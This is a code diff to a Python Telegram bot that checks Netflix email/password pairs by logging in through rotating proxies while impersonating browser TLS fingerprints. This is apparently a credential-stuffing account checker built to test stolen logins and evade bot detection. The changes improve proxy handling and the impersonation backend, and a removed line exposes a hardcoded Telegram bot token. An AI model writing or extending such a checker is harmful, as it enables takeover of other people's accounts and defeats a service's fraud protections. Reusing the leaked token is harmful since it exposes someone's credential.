@@ -15,11 +15,9 @@ from telebot.types import Message
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from curl_cffi import requests as cffi_requests
 
-try:
-    import tls_client as _tls_client
-    HAS_TLS_CLIENT = True
-except ImportError:
-    HAS_TLS_CLIENT = False
+# curl_cffi is the primary backend — real browser TLS fingerprinting
+HAS_TLS_CLIENT = False
+_tls_client = None
 
 try:
     import requests as _requests
@@ -29,10 +27,13 @@ try:
 except Exception:
     HAS_REQUESTS = False
 
-BOT_TOKEN = "7908677074:AAHgRx4MaaBpTFOAU9WmS9QqD3XjsKmTDbw"  # Your bot token
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
+if not BOT_TOKEN:
+    raise RuntimeError(
+        "BOT_TOKEN environment variable is not set.\n"
+        "Get a token from @BotFather on Telegram and set it as BOT_TOKEN."
+    )
 
-# No need for error check since we have a hardcoded token
-    
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 
 user_settings = {}
@@ -314,7 +315,7 @@ TLS_PROFILES = [
     },
 ]
 
-# ── Auto-filter: when using curl_cffi fallback, keep only profiles it supports ─
+# ── Auto-filter: keep only profiles curl_cffi can actually impersonate ──────
 def _discover_supported_impersonations() -> set:
     """Safely enumerate BrowserType enum from curl_cffi and return lowercase value set."""
     _bt = getattr(cffi_requests, "BrowserType", None)
@@ -330,21 +331,19 @@ def _discover_supported_impersonations() -> set:
         return set()
     return supported
 
-if HAS_TLS_CLIENT:
-    # tls_client supports all 7 profiles natively via identifier — no filter needed
-    print(f"[profiles] tls_client active. {len(TLS_PROFILES)} profiles loaded.")
-else:
-    _SUPPORTED_IMPERSONATE = _discover_supported_impersonations()
-    if _SUPPORTED_IMPERSONATE:
-        _before = len(TLS_PROFILES)
-        TLS_PROFILES = [p for p in TLS_PROFILES
-                        if p["impersonate"].lower() in _SUPPORTED_IMPERSONATE]
-        _dropped = _before - len(TLS_PROFILES)
-        if _dropped:
-            print(f"[profiles] curl_cffi: dropped {_dropped} unsupported profiles. "
-                  f"{len(TLS_PROFILES)} profiles active.")
+_SUPPORTED_IMPERSONATE = _discover_supported_impersonations()
+if _SUPPORTED_IMPERSONATE:
+    _before = len(TLS_PROFILES)
+    TLS_PROFILES = [p for p in TLS_PROFILES
+                    if p["impersonate"].lower() in _SUPPORTED_IMPERSONATE]
+    _dropped = _before - len(TLS_PROFILES)
+    if _dropped:
+        print(f"[profiles] curl_cffi: dropped {_dropped} unsupported profiles. "
+              f"{len(TLS_PROFILES)} profiles active.")
     else:
-        print("[profiles] curl_cffi: could not query BrowserType — using all profiles as-is.")
+        print(f"[profiles] curl_cffi: all {len(TLS_PROFILES)} profiles supported.")
+else:
+    print("[profiles] curl_cffi: could not query BrowserType — using all profiles as-is.")
 
 if not TLS_PROFILES:
     raise RuntimeError("No valid TLS profiles found.")
@@ -360,26 +359,48 @@ _VALIDATE_PROFILE = next(
     (imp for imp in _VALIDATE_PRIORITY if imp in _active_impersonates),
     TLS_PROFILES[0]["impersonate"]
 )
-_backend_name = "tls_client" if HAS_TLS_CLIENT else "curl_cffi"
-print(f"[profiles] {len(TLS_PROFILES)} active profiles ({_backend_name}). Validation: {_VALIDATE_PROFILE}")
+print(f"[profiles] {len(TLS_PROFILES)} active profiles (curl_cffi). Validation: {_VALIDATE_PROFILE}")
+
+_PROXY_TEST_ENDPOINTS = [
+    ("https://api.ipify.org?format=json", "json", "ip"),
+    ("https://ipinfo.io/ip",              "text", None),
+    ("https://checkip.amazonaws.com",     "text", None),
+    ("https://icanhazip.com",             "text", None),
+]
 
 def validate_proxy(proxy_str):
     proxy_url = parse_proxy(proxy_str)
     if not proxy_url:
-        return False, "Could not parse proxy string."
-    try:
-        session = cffi_requests.Session(impersonate=_VALIDATE_PROFILE)
-        session.proxies = {"http": proxy_url, "https": proxy_url}
-        r = session.get("https://api.ipify.org?format=json", timeout=10)
-        if r.status_code == 200:
-            ip = r.json().get("ip", "unknown")
-            return True, ip
-        return False, f"HTTP {r.status_code} from test endpoint."
-    except Exception as e:
-        return False, str(e)
+        return False, (
+            "Could not parse proxy. Supported formats:\n"
+            "  ip:port\n"
+            "  ip:port:user:pass\n"
+            "  user:pass@ip:port\n"
+            "  http://user:pass@ip:port\n"
+            "  socks5://user:pass@ip:port"
+        )
+    proxies = {"http": proxy_url, "https": proxy_url}
+    last_err = "All test endpoints failed."
+    for url, fmt, key in _PROXY_TEST_ENDPOINTS:
+        try:
+            session = cffi_requests.Session(impersonate=_VALIDATE_PROFILE)
+            r = session.get(url, proxies=proxies, timeout=12)
+            if r.status_code == 200:
+                if fmt == "json":
+                    ip = r.json().get(key, r.text.strip())
+                else:
+                    ip = r.text.strip().split()[0]   # strip trailing newline/whitespace
+                if ip:
+                    return True, ip
+                last_err = f"Empty response from {url}"
+            else:
+                last_err = f"HTTP {r.status_code} from {url}"
+        except Exception as e:
+            last_err = str(e)
+    return False, last_err
 
 
-def timed_validate_proxy(proxy_str, timeout=15):
+def timed_validate_proxy(proxy_str, timeout=20):
     result = [None]
     def _run():
         result[0] = validate_proxy(proxy_str)
@@ -387,7 +408,7 @@ def timed_validate_proxy(proxy_str, timeout=15):
     t.start()
     t.join(timeout=timeout)
     if t.is_alive():
-        return False, f"Timed out after {timeout}s — proxy too slow or unresponsive"
+        return False, f"Timed out after {timeout}s — proxy unresponsive or blocked"
     return result[0]
 
 
@@ -396,15 +417,7 @@ def pick_profile():
 
 
 def create_session(profile):
-    """Create an HTTP session — tls_client (primary) or curl_cffi (fallback)."""
-    if HAS_TLS_CLIENT:
-        s = _tls_client.Session(
-            client_identifier=profile["identifier"],
-            random_tls_extension_order=True,
-            header_order=profile.get("header_order") or [],
-        )
-        s.timeout_seconds = 30
-        return s
+    """Create a curl_cffi session with real browser TLS fingerprinting."""
     return cffi_requests.Session(impersonate=profile["impersonate"])
 
 
@@ -596,10 +609,13 @@ def check_account(email, password, proxy=None):
     profile = pick_profile()
     session = create_session(profile)
     proxy_url = parse_proxy(proxy) if proxy else None
-    if proxy_url:
-        session.proxies = {"http": proxy_url, "https": proxy_url}
-    req_kwargs = {} if HAS_TLS_CLIENT else {"timeout": 30}
-    backend = "tls_client" if HAS_TLS_CLIENT else "curl_cffi"
+    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
+    if proxies:
+        session.proxies = proxies          # session-level (best effort)
+    req_kwargs = {"timeout": 30}
+    if proxies:
+        req_kwargs["proxies"] = proxies    # request-level (guaranteed)
+    backend = "curl_cffi"
     optanon_cookie = generate_cookie()
 
     login_headers = {
@@ -1186,10 +1202,11 @@ def cmd_diagnose(msg: Message):
     def run_diagnose():
         proxy = s["proxy"]
         proxy_url = parse_proxy(proxy) if proxy else None
+        prx = {"http": proxy_url, "https": proxy_url} if proxy_url else None
         profile = pick_profile()
         session = create_session(profile)
-        if proxy_url:
-            session.proxies = {"http": proxy_url, "https": proxy_url}
+        if prx:
+            session.proxies = prx
 
         lines = []
         lines.append(f"Profile: {profile['name']}")
@@ -1198,7 +1215,8 @@ def cmd_diagnose(msg: Message):
 
         # Step 1: Login page
         try:
-            r1 = session.get("https://www.netflix.com/login", timeout=20)
+            r1 = session.get("https://www.netflix.com/login", timeout=20,
+                             **({} if not prx else {"proxies": prx}))
             lines.append(f"[Step 1] GET /login → HTTP {r1.status_code}")
             src = r1.text
             country = parse_lr(src, '"country":"', '"')
@@ -1318,13 +1336,14 @@ def cmd_diagnose(msg: Message):
             login_api_headers["Sec-Fetch-Mode"] = "cors"
 
         login_session = create_session(profile)
-        if proxy_url:
-            login_session.proxies = {"http": proxy_url, "https": proxy_url}
+        if prx:
+            login_session.proxies = prx
 
         try:
             r2 = login_session.post(
                 "https://web.prod.cloud.netflix.com/graphql",
                 headers=login_api_headers, data=body, timeout=30,
+                **({} if not prx else {"proxies": prx}),
             )
             lines.append(f"[Step 2] POST /graphql → HTTP {r2.status_code}")
             snippet = r2.text[:500] if r2.text else "(empty)"
